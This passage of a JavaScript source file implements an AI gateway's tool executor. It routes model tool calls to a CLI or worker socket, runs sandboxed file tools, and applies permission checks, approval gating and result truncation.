/**
 * Tool Executor for Vodou-Console - Simplified Direct vodou-core Integration
 *
 * Executes ANY vodou-core tool directly via CLI.
 * One generic tool instead of many specialized ones.
 *
 * Version: 0.5.33.6 - Direct vodou-core Integration
 */
import { spawn, execFileSync } from 'child_process';
import { sockConnectTarget } from './cli-portability.js';
import { readFileSync, writeFileSync, mkdirSync, readdirSync, statSync, unlinkSync, existsSync, access, constants as fsConstants } from 'fs';
import net from 'net';
import { createHash } from 'crypto';
import path from 'path';
import { getDb, getProjectRoot } from './db.js';
import { deriveToolUsageScope, emitToolUsageMemory, summarizeResult } from './api/memory-client.js';
import { projectContextProjectId } from './project-context.js';
import { skillFabricationVerdict } from './api/board.js';
import { recordTrajectoryStep } from './trajectory-capture.js';
import { sandboxWrite, sandboxReadLines, sandboxList, sandboxSearch, sandboxEdit, sandboxMultiEdit, sandboxGrep, sandboxGlob, sandboxStat, sandboxTree } from './fs-sandbox.js';
import { fsToolsActive } from './tools.js';
import { getCostProfile } from './cost-profile.js';
import { getConversation } from './conversation-store.js';
import { checkToolPermission } from './permissions.js';
import { createApproval } from './approvals.js';
// FS tool names — used to enforce the SAME flag + web-source gate at the execution
// sink that tools.ts applies at the offer site (defense-in-depth: a model may emit
// a tool_use for a tool that was never offered).
const FS_TOOL_NAMES = new Set(['write_file', 'read_file', 'list_dir', 'edit_file', 'multi_edit', 'search_files', 'grep', 'glob', 'file_stat', 'directory_tree']);
// read_file inline default (bytes) when the model gives no max_bytes — keeps big
// files out of the context; the model can paginate with max_bytes up to the
// sandbox hard cap. list_dir entry cap likewise bounds a huge directory listing.
const FS_READ_INLINE_DEFAULT = 65536; // 64 KB
const FS_LIST_MAX_ENTRIES = 500;
// Trajectory hygiene: replace large file-body args with a size marker so
// write_file/edit_file calls don't bloat gateway_tool_trajectories.steps_json.
const TRAJECTORY_ARG_PREVIEW = 200;
function summarizeFsArgs(input) {
    const out = {};
    for (const [k, v] of Object.entries(input)) {
        if (typeof v === 'string' && v.length > TRAJECTORY_ARG_PREVIEW) {
            out[k] = `${v.slice(0, TRAJECTORY_ARG_PREVIEW)}…[${v.length} chars]`;
        }
        else {
            out[k] = v;
        }
    }
    return out;
}
// The core binary carries a .exe suffix on Windows; Node's spawn() does NOT do
// PATHEXT resolution for explicit paths, so an extensionless path just ENOENTs.
const CORE_BIN = process.platform === 'win32' ? 'vodou-core.exe' : 'vodou-core';
const VC_PATH = () => process.env.VC_PATH || process.env.BT4_PATH || path.join(getProjectRoot(), CORE_BIN);
const WORKER_SOCK_PATH = () => path.join(getProjectRoot(), '.vodou', 'worker.sock');
const WORKER_PID_PATH = () => path.join(getProjectRoot(), '.vodou', 'worker.pid');
/**
 * Check if the worker process is actually alive by reading its pid file and
 * sending signal 0 (no-op probe). This is the strongest "is the worker up?"
 * signal — much better than first-byte timers, which misfire when brain queries
 * legitimately take 5-15s to start emitting output (MCP tool lookups etc.).
 */
function isWorkerProcessAlive() {
    try {
        const pid = parseInt(readFileSync(WORKER_PID_PATH(), 'utf-8').trim(), 10);
        if (!pid || isNaN(pid))
            return false;
        process.kill(pid, 0); // signal 0 = existence check, throws if dead
        return true;
    }
    catch {
        return false;
    }
}
/**
 * Re-read .env from disk on every spawn so edits take effect without restarting the gateway.
 */
export function freshEnv() {
    const envPath = path.resolve(getProjectRoot(), '.env');
    const overrides = {};
    try {
        const lines = readFileSync(envPath, 'utf-8').split('\n');
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#'))
                continue;
            const eqIdx = trimmed.indexOf('=');
            if (eqIdx < 1)
                continue;
            const key = trimmed.substring(0, eqIdx).trim();
            let val = trimmed.substring(eqIdx + 1).trim();
            if ((val.startsWith('"') && val.endsWith('"')) ||
                (val.startsWith("'") && val.endsWith("'"))) {
                val = val.slice(1, -1);
            }
            // Skip empty credential values from .env — fresh installs have VODOU_TOKEN= (empty)
            // which would re-introduce the empty string we just stripped from process.env
            const credKeys = ['VODOU_TOKEN', 'VODOU_USER_ID', 'ANTHROPIC_API_KEY', 'OPENAI_API_KEY'];
            if (credKeys.includes(key) && !val)
                continue;
            overrides[key] = val;
        }
    }
    catch (err) {
        console.error(`[freshEnv] Failed to read .env from ${envPath}: ${err.message}`);
    }
    // Build env: start with process.env, strip empty credential vars
    // (harness/launcher may inject VODOU_TOKEN="" which blocks dotenv from loading .env values),
    // then apply .env overrides on top
    const base = { ...process.env };
    const credentialKeys = ['VODOU_TOKEN', 'VODOU_USER_ID', 'ANTHROPIC_API_KEY', 'OPENAI_API_KEY'];
    for (const key of credentialKeys) {
        if (base[key] === '')
            delete base[key];
    }
    const merged = { ...base, ...overrides };
    if (process.env.DEBUG) {
        const tokenVal = merged.VODOU_TOKEN || '';
        const userVal = merged.VODOU_USER_ID || '';
        console.error(`[freshEnv] VODOU_TOKEN=${tokenVal ? tokenVal.substring(0, 8) + '...' : 'EMPTY'} VODOU_USER_ID=${userVal ? userVal.substring(0, 8) + '...' : 'EMPTY'} (overrides had ${Object.keys(overrides).length} keys from ${envPath})`);
    }
    return merged;
}
// Timeout for tool execution (default: 2 minutes)
const DEFAULT_TIMEOUT = parseInt(process.env.TOOL_TIMEOUT || '120000', 10);
/** If `1`, spawn `./vodou-core all-tools` (slow live MCP discovery). Default: read vodou-core.db only. */
const LIST_TOOLS_LIVE_CLI = process.env.VODOU_GATEWAY_LIST_TOOLS_LIVE === '1';
/**
 * Build the catalog string for list_available_tools from local SQLite (tools + mcp_servers).
 * Matches orchestration semantics: active servers only (COALESCE(active,1) != 0).
 *
 * When `opts.scope` is set, the catalog is filtered to that scope's tools.
 * For integration scopes, that means just the named MCP server. For skill/flow
 * scopes, the current MVP returns an empty catalog — the skill/flow runner
 * surfaces its own tool list to the LLM via other channels.
 */
export function formatCachedToolsCatalogForLlm(opts) {
    const db = getDb();
    if (opts?.scope?.type === 'skill' || opts?.scope?.type === 'flow') {
        // Skill/flow surfaces are owned by their runners; no MCP catalog.
        return `No MCP tools exposed in this ${opts.scope.type} workbench. Follow the scope's instructions and stopping points.`;
    }
    const scopeServer = opts?.scope?.type === 'integration' ? opts.scope.id : null;
    const baseQuery = `SELECT t.name AS tool_name, t.description, s.name AS server_name, s.health_status
       FROM tools t
       JOIN mcp_servers s ON t.server_id = s.id
       WHERE COALESCE(s.active, 1) != 0`;
    const rows = (scopeServer
        ? db.prepare(baseQuery + ' AND s.name = ? ORDER BY s.name, t.name').all(scopeServer)
        : db.prepare(baseQuery + ' ORDER BY s.name, t.name').all());
    if (rows.length === 0) {
        const serverCount = db.prepare(`SELECT COUNT(*) AS c FROM mcp_servers`).get().c;
        return [
            'No MCP tools are cached in vodou-core.db yet.',
            serverCount > 0
                ? `There are ${serverCount} server row(s) registered — run **Capabilities → MCP Servers → Refresh status** once to populate the local tools table (that refresh may call \`./vodou-core tools <server>\` / \`all-tools\` — slow live discovery). For lookup mid-turn use \`./vodou-core list-tools-db --server <name>\` only.`
                : 'Add a server from the gateway, then refresh status or run `./vodou-core connect …`.',
            '',
            'After the DB has tools, list_available_tools / list-tools-db are instant (no remote MCP round-trips).',
        ].join('\n');
    }
    const byServer = new Map();
    for (const r of rows) {
        const arr = byServer.get(r.server_name) || [];
        arr.push(r);
        byServer.set(r.server_name, arr);
    }
    const names = [...byServer.keys()].sort((a, b) => a.localeCompare(b));
    const lines = [
        `MCP tool catalog (local vodou-core.db cache — ${rows.length} tools, ${names.length} active servers). No live MCP discovery was run for this list.`,
        '',
    ];
    for (const srv of names) {
        const tools = byServer.get(srv);
        const h = tools[0]?.health_status;
        lines.push(`📦 ${srv} (${tools.length} tools)${h ? ` — last health: ${h}` : ''}`);
        for (const t of tools) {
            const desc = (t.description || '').replace(/\s+/g, ' ').trim().slice(0, 140);
            lines.push(`   • ${t.tool_name}${desc ? ` — ${desc}` : ''}`);
        }
        lines.push('');
    }
    lines.push('To invoke a tool from chat, use **vodou_core_call** with server, tool, and args.');
    return lines.join('\n');
}
/**
 * Render ONE tool's full definition — name, description, and `input_schema`
 * (the typed JSON Schema) — from the local `tools` cache, so the model can call
 * `vodou_core_call` with the right args instead of guessing (PLAN-LLM-CAPABILITY-
 * AWARENESS Phase 1, `describe_tool`). Read-only; honors `ctx.scope` exactly like
 * the catalog (skill/flow → none; integration → only the scoped server).
 */
export function describeToolForLlm(server, tool, opts) {
    if (opts?.scope?.type === 'skill' || opts?.scope?.type === 'flow') {
        return `No MCP tools exposed in this ${opts.scope.type} workbench. Follow the scope's instructions and stopping points.`;
    }
    if (!server || !tool) {
        return 'error: describe_tool requires both `server` and `tool`. Use list_available_tools to discover names.';
    }
    if (opts?.scope?.type === 'integration' && opts.scope.id !== server) {
        return `This workbench is scoped to "${opts.scope.id}"; "${server}::${tool}" is out of scope.`;
    }
    const db = getDb();
    const row = db.prepare(`SELECT t.name AS tool_name, t.description, t.input_schema, s.name AS server_name
       FROM tools t JOIN mcp_servers s ON t.server_id = s.id
      WHERE s.name = ? AND t.name = ? AND COALESCE(s.active, 1) != 0
      LIMIT 1`).get(server, tool);
    if (!row) {
        return [
            `No cached tool "${tool}" on server "${server}".`,
            'Check the name with **list_available_tools**, or refresh **Capabilities → MCP Servers** if the catalog looks stale.',
        ].join('\n');
    }
    const lines = [`# ${row.server_name}::${row.tool_name}`];
    if (row.description && row.description.trim()) {
        lines.push('', row.description.trim());
    }
    lines.push('', 'Input schema (JSON Schema — match this when building `args`):');
    let schemaStr = row.input_schema || '{}';
    try {
        schemaStr = JSON.stringify(JSON.parse(schemaStr), null, 2);
    }
    catch {
        /* leave the raw stored string if it isn't valid JSON */
    }
    lines.push('```json', schemaStr, '```');
    lines.push('', `To call it: **vodou_core_call** with server="${row.server_name}", tool="${row.tool_name}", args={…per the schema above…}.`);
    return lines.join('\n');
}
/**
 * Once we detect the worker socket is dead (zombie, ENOENT, ECONNREFUSED), we
 * remember that for a short window so subsequent calls skip straight to CLI
 * fallback without re-paying the first-byte timeout. Cleared on any successful
 * response (which implies a healthy worker is back).
 */
let _deadSocketUntil = 0;
const DEAD_SOCKET_COOLDOWN_MS = parseInt(process.env.VODOU_WORKER_SOCK_DEAD_COOLDOWN_MS || '10000', 10);
// Single-flight dedupe for tool calls. When a tool is slow (e.g. a cold-spawned
// Vodou-LLM-router taking minutes because the worker socket was down), every
// *concurrent* re-dispatch of the SAME (server, tool, args) would otherwise
// spawn its own vodou-core subprocess — the 210s "chuck-norris" spawn storm
// Chad hit 2026-06-08. We collapse overlapping identical calls onto one shared
// promise. The entry is deleted the instant that promise settles, so this only
// ever affects genuinely concurrent calls — sequential calls (and the per-
// conversation sequential workflow engine) are untouched. Kill-switch:
// VODOU_TOOL_DEDUP=0. NOTE: collapses concurrent identical *writes* too; that's
// the desired anti-double-submit behavior here, but see the 0.5.35 follow-on
// plan for category-aware gating if a write workload ever needs N-of-N.
const TOOL_DEDUP_ENABLED = process.env.VODOU_TOOL_DEDUP !== '0';
const _inflightToolCalls = new Map();
function markSocketDead(reason) {
    _deadSocketUntil = Date.now() + DEAD_SOCKET_COOLDOWN_MS;
    console.error(`[worker-sock] marking socket dead for ${DEAD_SOCKET_COOLDOWN_MS}ms (reason: ${reason})`);
}
function clearSocketDead() {
    if (_deadSocketUntil !== 0) {
        console.error(`[worker-sock] socket recovered — clearing dead flag`);
        _deadSocketUntil = 0;
    }
}
/**
 * Send a command to the worker via Unix socket.
 * Fast path: ~1-2ms vs 50-200ms for CLI spawn.
 * Returns null if socket unavailable (caller falls back to CLI).
 */
export async function callWorkerSocket(cmd, cmdArgs, timeout = DEFAULT_TIMEOUT) {
    if (Date.now() < _deadSocketUntil) {
        // Still inside the dead-socket cooldown — don't waste time re-probing
        return null;
    }
    // Pre-flight: if the worker PID is dead, skip the socket immediately with zero
    // wait and let the caller use CLI. This is the *only* reliable zombie signal —
    // first-byte timeouts are unreliable because vodou-core buffers stdout until
    // query completion, so a legitimate 25s BrainLoader query looks identical to a
    // zombie worker for the first 25s.
    if (!isWorkerProcessAlive()) {
        markSocketDead('pre-flight: worker pid dead');
        return null;
    }
    const sockPath = WORKER_SOCK_PATH();
    return new Promise((resolve) => {
        let settled = false;
        const startMs = Date.now();
        // Bug 3: on Windows the worker serves a NAMED PIPE (ipc.rs), not a .sock
        // file. sockConnectTarget() maps the path to the pipe name so this connect
        // succeeds — without it every tool call ENOENTs and falls back to a CLI
        // spawn (broken tool routing + a flashing conhost window per call).
        const sock = net.createConnection(sockConnectTarget(sockPath));
        let data = '';
        // Outer timeout is the only timer — no first-byte watchdog. If the worker
        // PID was alive at pre-flight, trust the worker and wait up to `timeout`
        // (default 60s for brain; caller-provided otherwise). Falling back to CLI
        // before the outer timeout fires is strictly worse, because CLI runs the
        // same slow vodou-core code plus ~200ms process spawn cost.
        const timer = setTimeout(() => {
            if (!settled) {
                settled = true;
                const pidAlive = isWorkerProcessAlive();
                console.error(`[worker-sock] OUTER TIMEOUT cmd=${cmd} after ${Date.now() - startMs}ms (limit ${timeout}ms, pid alive=${pidAlive}) — falling back`);
                if (!pidAlive)
                    markSocketDead(`outer timeout, pid dead`);
                sock.destroy();
                resolve(null);
            }
        }, timeout);
        sock.on('connect', () => {
            sock.write(JSON.stringify({ cmd, args: cmdArgs }) + '\n');
        });
        sock.on('data', (chunk) => {
            data += chunk.toString();
            // Worker sends newline-terminated JSON responses
            const nlIdx = data.indexOf('\n');
            if (nlIdx >= 0) {
                clearTimeout(timer);
                if (!settled) {
                    settled = true;
                    const elapsed = Date.now() - startMs;
                    if (elapsed > 2000) {
                        console.error(`[worker-sock] SLOW cmd=${cmd} took ${elapsed}ms`);
                    }
                    clearSocketDead();
                    sock.destroy();
                    try {
                        resolve(JSON.parse(data.substring(0, nlIdx)));
                    }
                    catch {
                        resolve(null);
                    }
                }
            }
        });
        sock.on('error', (err) => {
            clearTimeout(timer);
            if (!settled) {
                settled = true;
                const code = err.code || err.message;
                console.error(`[worker-sock] ERROR cmd=${cmd} after ${Date.now() - startMs}ms: ${code}`);
                // ENOENT = socket file missing; ECONNREFUSED = no listener. Both imply
                // the worker is down — skip re-probing for the cooldown window.
                if (code === 'ENOENT' || code === 'ECONNREFUSED') {
                    markSocketDead(`connect ${code}`);
                }
                resolve(null);
            }
        });
    });
}
/**
 * Execute any vodou-core tool directly.
 *
 * `ctx.scope`, when present, narrows `list_available_tools` to the current
 * workbench's server (or returns a skill/flow stub). Tool *invocation*
 * (`vodou_core_call`) is not blocked by scope — the LLM can still call a
 * different server if it has a reason. Enforcement is by system-prompt
 * guidance, not hard lockout, so scope is a nudge rather than a cage.
 */
export async function executeOITool(name, input, ctx) {
    const startTime = Date.now();
    // PLAN-SKILL-LEARNING-LOOP Phase 1A — record this call into the conversation's
    // trajectory. This is the shared sink for ALL API providers (anthropic, openai,
    // openai-compat, ollama, custom), so one record point covers every one of them.
    // No-op when conversationId is absent (board-worker / non-chat callers).
    const recordStep = (ok) => {
        if (!ctx?.conversationId)
            return;
        const isCore = name === 'vodou_core_call';
        const server = isCore ? String(input.server ?? '') : 'gateway';
        const tool = isCore ? String(input.tool ?? '') : name;
        // Don't persist whole file bodies into the trajectory steps_json — write_file
        // content / edit_file strings can be megabytes and would bloat the DB row.
        const args = isCore ? (input.args ?? {}) : (FS_TOOL_NAMES.has(name) ? summarizeFsArgs(input) : input);
        recordTrajectoryStep(ctx.conversationId, { server, tool, args, ok, ms: Date.now() - startTime });
    };
    try {
        // #7 Item 2 (chat-side) — active-skill tool allowlist. While a skill that declares
        // an explicit policy is the active executor, a tool outside its allow-list (when
        // non-empty) or in its deny-list is refused with a structured reason the model
        // sees. This is the per-skill SCOPE; the Bet #2 category engine below is the global
        // RISK tier — both apply, deny wins. Applies even on the approved resume path
        // (a hard scope, not an approvable category). No policy → no restriction (opt-in).
        const pol = ctx?.activeToolPolicy;
        if (pol && (pol.disallowed.includes(name) || (pol.allowed.length > 0 && !pol.allowed.includes(name)))) {
            recordStep(false);
            const why = pol.disallowed.includes(name)
                ? `'${name}' is in the active skill's disallowed-tools`
                : `'${name}' is not in the active skill's allowed-tools (${pol.allowed.join(', ')})`;
            return { success: false, output: '', error: `${why}; refuse it and use a permitted tool.`, executionTime: Date.now() - startTime };
        }
        // Bet #2 — category permission engine (fail-closed). Default profile is all-auto
        // (no behavior change). Skipped entirely on the /chat/approve resume path
        // (ctx.approved). Ungated tools (reads, vodou_core_call) always pass.
        if (!ctx?.approved) {
            const perm = checkToolPermission(name, ctx?.scope, undefined, input);
            if (perm.mode === 'ask' && perm.category) {
                // Phase 2 out-of-band approval: park the action + ask the client; do NOT run.
                if (ctx?.onEvent && ctx?.conversationId) {
                    const pending = createApproval(ctx.conversationId, name, input, perm.category);
                    // Summarize args so a large write/edit payload (full file content) doesn't
                    // bloat the approval card or the wire; the user only needs the gist to decide.
                    ctx.onEvent({ type: 'approval_requested', toolName: name, toolArgs: summarizeFsArgs(input), approvalToken: pending.token, category: perm.category });
                    recordStep(false);
                    return { success: false, output: '', error: `⏳ '${name}' requires your approval (${perm.category}) and was NOT performed. Tell the user to approve it; do not retry.`, executionTime: Date.now() - startTime };
                }
                // No channel to ask on (no onEvent/conversationId) → fail closed.
                recordStep(false);
                return { success: false, output: '', error: `'${name}' requires approval ('${perm.category}'), unavailable in this context.`, executionTime: Date.now() - startTime };
            }
            if (perm.mode === 'deny') {
                recordStep(false);
                return { success: false, output: '', error: perm.reason || 'denied by permission policy', executionTime: Date.now() - startTime };
            }
        }
        // Execution-layer gate (defense-in-depth) — enforce the SAME invariant the
        // offer site uses (tools.ts getActiveTools): FS tools only run when the flag is
        // on AND the conversation is a web chat. A model that emits an un-offered FS
        // tool_use (hallucination / injected tool-call) must NOT reach the disk.
        if (FS_TOOL_NAMES.has(name)) {
            const src = getConversation(ctx?.conversationId ?? '')?.source ?? null;
            if (!fsToolsActive(src, ctx?.conversationId)) {
                recordStep(false);
                return {
                    success: false,
                    output: '',
                    error: `Tool '${name}' is not available in this context.`,
                    executionTime: Date.now() - startTime,
                };
            }
        }
        let result;
        switch (name) {
            case 'vodou_core_call':
                // Direct vodou-core call - the ONLY tool we need
                result = await runVodouCore(input.server, input.tool, input.args || {});
                break;
            case 'list_available_tools':
                // Scoped conversations: always use the cached catalog (live CLI path
                // doesn't understand scope). Unscoped: existing behavior.
                if (ctx?.scope) {
                    result = formatCachedToolsCatalogForLlm({ scope: ctx.scope });
                }
                else {
                    result = LIST_TOOLS_LIVE_CLI
                        ? await runVodouCoreCommand('all-tools')
                        : formatCachedToolsCatalogForLlm();
                }
                result = capInlineResult(result, INLINE_TOOL_CAP, 'tool catalog', ctx?.conversationId);
                break;
            case 'describe_tool': {
                // Read-only: return one tool's input_schema so the model calls
                // vodou_core_call with correct args instead of guessing.
                const dtServer = String(input.server ?? '').trim();
                const dtTool = String(input.tool ?? '').trim();
                result = describeToolForLlm(dtServer, dtTool, { scope: ctx?.scope });
                result = capInlineResult(result, INLINE_TOOL_CAP, 'describe_tool', ctx?.conversationId);
                break;
            }
            case 'search_tools': {
                // Read-only: semantic "find a tool by meaning" over the intent index.
                const stQuery = String(input.query ?? '').trim();
                result = await searchToolsForLlm(stQuery, { scope: ctx?.scope });
                result = capInlineResult(result, INLINE_TOOL_CAP, 'search_tools', ctx?.conversationId);
                break;
            }
            case 'expand_result': {
                // WS4: retrieve more of a previously truncated/parked tool result by id —
                // universal (works on any tier; the full blob lives out-of-band, never re-sent).
                const expandId = String(input.id ?? '').trim();
                const rawOffset = input.offset;
                const offset = typeof rawOffset === 'number'
                    ? rawOffset
                    : (rawOffset != null && String(rawOffset).trim() !== '' ? parseInt(String(rawOffset), 10) : undefined);
                const query = typeof input.query === 'string' && input.query.trim() ? input.query : undefined;
                result = expandStoredResult(expandId, {
                    offset: Number.isFinite(offset) ? offset : undefined,
                    query,
                });
                break;
            }
            // ── Board worker tools (gateway-dispatch path) ────────────────────────
            case 'board_show': {
                const taskId = String(input.task_id ?? '').trim();
                if (!taskId) {
                    result = 'error: task_id required';
                    break;
                }
                result = capInlineResult(await runBoardCommand('show', taskId), INLINE_TOOL_CAP, 'board_show', ctx?.conversationId);
                break;
            }
            case 'board_complete': {
                const taskId = String(input.task_id ?? '').trim();
                const summary = String(input.summary ?? '').trim();
                if (!taskId) {
                    result = 'error: task_id required';
                    break;
                }
                if (!summary) {
                    result = 'error: summary required';
                    break;
                }
                // Layer 3 anti-fabrication: a board_complete that claims a skill run the
                // engine never recorded gets blocked, not marked done.
                const verdict = skillFabricationVerdict(taskId, summary);
                if (verdict.blocked) {
                    // `board block <ID> <REASON>` — REASON is positional; `--` guards a
                    // reason that might start with '-' from being parsed as a flag.
                    await runBoardCommand('block', taskId, '--', verdict.reason);
                    result = `BLOCKED (anti-fabrication): ${verdict.reason}`;
                    break;
                }
                result = await runBoardCommand('complete', taskId, '--summary', summary);
                break;
            }
            case 'board_block': {
                const taskId = String(input.task_id ?? '').trim();
                const reason = String(input.reason ?? '').trim();
                if (!taskId) {
                    result = 'error: task_id required';
                    break;
                }
                if (!reason) {
                    result = 'error: reason required';
                    break;
                }
                // `board block <ID> <REASON>` — REASON is positional (NOT a --reason
                // flag); `--` guards a reason that might start with '-'.
                result = await runBoardCommand('block', taskId, '--', reason);
                break;
            }
            case 'board_heartbeat': {
                const taskId = String(input.task_id ?? '').trim();
                if (!taskId) {
                    result = 'error: task_id required';
                    break;
                }
                const noteArgs = input.note ? ['--note', String(input.note)] : [];
                result = await runBoardCommand('heartbeat', taskId, ...noteArgs);
                break;
            }
            // ─────────────────────────────────────────────────────────────────────
            // ── FS tools (managed/API web-chat) — PLAN 0.6.4 §4.1 ─────────────────
            // Thin wrappers over fs-sandbox (the single trusted confinement sink). A
            // thrown SandboxError falls through to the outer catch → {success:false} +
            // recordStep(false), so detectFileChanges (gated on result.success) never
            // records a refused/failed write or a no-match edit. Execution is gated above
            // (FS_TOOL_NAMES guard) on the SAME flag + web-source invariant as the offer
            // site, so this code path is unreachable unless the feature is active.
            // NB: read_file/list_dir output is returned as JSON directly — NOT through
            // cleanToolOutput, which is for vodou-core CLI stdout (it strips text before
            // a `📤 Result:`/`{` marker and parks >10KB in .vodou/tool-results/, a path
            // the sandboxed model cannot read back). We cap inline size here instead.
            case 'write_file': {
                const r = sandboxWrite({ conversationId: ctx?.conversationId }, String(input.path ?? input.file_path ?? ''), typeof input.content === 'string' ? input.content : String(input.content ?? ''), (input.mode || 'create'));
                result = JSON.stringify({ ok: true, ...r });
                break;
            }
            case 'read_file': {
                // #1.6 (ACI) — windowed, line-numbered read. offset/limit page a big file
                // (default window = first 2000 lines); max_bytes still caps the disk read.
                // truncated/endLine/totalLines tell the model how to page. The cat -n gutter
                // round-trips with edit_file (the applier strips it).
                const offset = typeof input.offset === 'number' && input.offset > 0 ? input.offset : undefined;
                const limit = typeof input.limit === 'number' && input.limit > 0 ? input.limit : undefined;
                const mb = typeof input.max_bytes === 'number' && input.max_bytes > 0 ? input.max_bytes : undefined;
                const r = sandboxReadLines({ conversationId: ctx?.conversationId }, String(input.path ?? input.file_path ?? ''), { offset, limit, maxBytes: mb });
                result = JSON.stringify(r);
                break;
            }
            case 'list_dir': {
                const r = sandboxList({ conversationId: ctx?.conversationId }, String(input.path ?? '.'));
                // Cap a huge directory listing so it can't flood the context.
                const truncated = r.entries.length > FS_LIST_MAX_ENTRIES;
                const entries = truncated ? r.entries.slice(0, FS_LIST_MAX_ENTRIES) : r.entries;
                result = JSON.stringify({ path: r.path, entries, entryCount: r.entries.length, truncated });
                break;
            }
            case 'edit_file': {
                const r = sandboxEdit({ conversationId: ctx?.conversationId }, String(input.path ?? input.file_path ?? ''), String(input.old_string ?? ''), typeof input.new_string === 'string' ? input.new_string : String(input.new_string ?? ''), input.replace_all === true);
                result = JSON.stringify({ ok: true, ...r });
                break;
            }
            case 'multi_edit': {
                const rawEdits = Array.isArray(input.edits) ? input.edits : [];
                const edits = rawEdits.map((e) => ({
                    oldString: String(e?.old_string ?? ''),
                    newString: typeof e?.new_string === 'string' ? e.new_string : String(e?.new_string ?? ''),
                    replaceAll: e?.replace_all === true,
                }));
                const r = sandboxMultiEdit({ conversationId: ctx?.conversationId }, String(input.path ?? input.file_path ?? ''), edits);
                result = JSON.stringify({ ok: true, ...r });
                break;
            }
            case 'search_files': {
                // #1.6 (ACI) — summarized search: files-with-a-match (path + first line),
                // not full content. The model locates code, then read_file's the window.
                const r = sandboxSearch({ conversationId: ctx?.conversationId }, String(input.query ?? ''), {
                    path: typeof input.path === 'string' ? input.path : undefined,
                    regex: input.regex === true,
                    maxResults: typeof input.max_results === 'number' ? input.max_results : undefined,
                });
                result = JSON.stringify(r);
                break;
            }
            case 'grep': {
                // Every matching line (+ optional context), unlike search_files' first-per-file.
                const r = sandboxGrep({ conversationId: ctx?.conversationId }, String(input.query ?? ''), {
                    path: typeof input.path === 'string' ? input.path : undefined,
                    regex: input.regex === true,
                    glob: typeof input.glob === 'string' ? input.glob : undefined,
                    context: typeof input.context === 'number' ? input.context : undefined,
                    maxResults: typeof input.max_results === 'number' ? input.max_results : undefined,
                    maxPerFile: typeof input.max_per_file === 'number' ? input.max_per_file : undefined,
                });
                result = JSON.stringify(r);
                break;
            }
            case 'glob': {
                const r = sandboxGlob({ conversationId: ctx?.conversationId }, String(input.pattern ?? ''), {
                    path: typeof input.path === 'string' ? input.path : undefined,
                    maxResults: typeof input.max_results === 'number' ? input.max_results : undefined,
                });
                result = JSON.stringify(r);
                break;
            }
            case 'file_stat': {
                const r = sandboxStat({ conversationId: ctx?.conversationId }, String(input.path ?? input.file_path ?? ''));
                result = JSON.stringify(r);
                break;
            }
            case 'directory_tree': {
                const r = sandboxTree({ conversationId: ctx?.conversationId }, {
                    path: typeof input.path === 'string' ? input.path : undefined,
                    depth: typeof input.depth === 'number' ? input.depth : undefined,
                    maxEntries: typeof input.max_entries === 'number' ? input.max_entries : undefined,
                });
                result = JSON.stringify(r);
                break;
            }
            // ─────────────────────────────────────────────────────────────────────
            default:
                recordStep(false);
                return {
                    success: false,
                    output: '',
                    error: `Unknown tool: ${name}. Use 'vodou_core_call' with server/tool params.`,
                    executionTime: Date.now() - startTime
                };
        }
        // Stage 4 + Amendment A: tool-usage auto-extractor.
        // Fires on every successful vodou_core_call, regardless of scope.
        // deriveToolUsageScope() routes web-origin calls to the integration's canonical
        // scope so Asana calls from main chat land in workbench:integration:asana memory,
        // not the generic 'web' bucket. Fire-and-forget — must not block the response.
        if (name === 'vodou_core_call' && !process.env.VODOU_DISABLE_TOOL_USAGE_MEMORIES) {
            const server = String(input.server ?? '').trim();
            const toolUsageScope = deriveToolUsageScope(ctx?.scope, server);
            void emitToolUsageMemory({
                scope: toolUsageScope,
                server,
                tool: String(input.tool ?? ''),
                args: input.args ?? {},
                resultSummary: summarizeResult(result, 120),
                // PLAN-PROJECT-SCOPED-MEMORY — the turn's project rides the async-local
                // project context (set at chat() entry), so every provider path tags
                // usage memories without threading a param through dispatch.
                projectId: projectContextProjectId(),
            }).catch((err) => console.error('[tool-usage-extractor] emit failed:', err));
        }
        recordStep(true);
        return {
            success: true,
            output: result,
            executionTime: Date.now() - startTime
        };
    }
    catch (error) {
        recordStep(false);
        return {
            success: false,
            output: '',
            error: error instanceof Error ? error.message : String(error),
            executionTime: Date.now() - startTime
        };
    }
}
const MAX_INLINE_RESULT = 10_000; // 10KB — larger results go to disk
const PREVIEW_SIZE = 2_000; // 2KB preview for LLM
// WS4 (PLAN-GATEWAY-STATE-LAYER) — truncate-with-handle. Tools whose output the model
// must READ inline (list_available_tools full catalog, board_show) can be large enough to
// balloon the chat context when re-sent every tool-call round (the OpenAI-compat loop
// accumulates + re-sends the whole message array each iteration — the 273K-balloon
// multiplier). We head-cap the inline copy AND stash the full blob out-of-band, returning
// an expand_result(id) handle so the rest is retrievable WITHOUT re-sending it. Retires the
// old lossy "narrow the query" band-aid. See PLANS/0.6.5/PLAN-GATEWAY-STATE-LAYER.md WS4.
const INLINE_TOOL_CAP = parseInt(process.env.VODOU_TOOL_RESULT_CAP || '16000', 10);
const EXPAND_WINDOW = 8_000; // chars returned per expand_result call (keeps expand itself bounded)
const STASH_DIR = () => path.join(getProjectRoot(), '.vodou', 'tool-results');
let _stashCounter = 0;
function makeStashId(convId) {
    const c = (convId || 'g').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 8) || 'g';
    return `${c}-${Date.now().toString(36)}-${(_stashCounter++).toString(36)}`;
}
function stashFullResult(id, full) {
    try {
        mkdirSync(STASH_DIR(), { recursive: true });
    }
    catch { }
    try {
        writeFileSync(path.join(STASH_DIR(), `${id}.txt`), full);
    }
    catch { }
}
/** WS4 expand_result backend: return a bounded window (or query-filtered lines) of a parked result. */
function expandStoredResult(id, opts) {
    const safe = String(id || '').replace(/[^a-zA-Z0-9_-]/g, '');
    if (!safe)
        return JSON.stringify({ error: 'expand_result: id required' });
    let full;
    try {
        full = readFileSync(path.join(STASH_DIR(), `${safe}.txt`), 'utf-8');
    }
    catch {
        return JSON.stringify({ error: `expand_result: id "${id}" not found or expired (parked results are kept ~24h).` });
    }
    if (opts?.query) {
        const q = opts.query.toLowerCase();
        const hits = full.split('\n').filter((l) => l.toLowerCase().includes(q));
        const joined = hits.join('\n');
        const capped = joined.length > EXPAND_WINDOW;
        return JSON.stringify({ id: safe, query: opts.query, matches: hits.length, content: capped ? joined.slice(0, EXPAND_WINDOW) + '\n…[capped — refine query]' : joined });
    }
    const start = Math.max(0, Math.floor(opts?.offset ?? 0));
    const content = full.slice(start, start + EXPAND_WINDOW);
    const next = start + content.length;
    const more = next < full.length;
